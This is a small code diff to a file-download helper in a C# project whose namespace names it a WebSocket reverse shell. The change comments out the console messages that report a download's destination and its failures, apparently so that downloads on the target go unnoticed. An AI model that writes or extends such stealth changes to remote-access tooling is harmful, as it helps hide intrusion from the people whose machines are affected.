@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Net;
 using System.Text;
@@ -32,14 +33,14 @@ namespace WebSocketReverseShellDotNet.utils
                     // Download the file
                     webClient.DownloadFile(uri, destinationPath);
 
-                    Console.WriteLine("File downloaded to: " + destinationPath);
+                    /*Console.WriteLine("File downloaded to: " + destinationPath);*/
 
                     return new FileInfo(destinationPath);
                 }
             }
             catch (Exception e)
             {
-                Console.Error.WriteLine("Failed to download the file from " + fileUrl);
+                /*Console.Error.WriteLine("Failed to download the file from " + fileUrl);*/
                 throw new Exception("Failed to download the file", e);
             }
         }
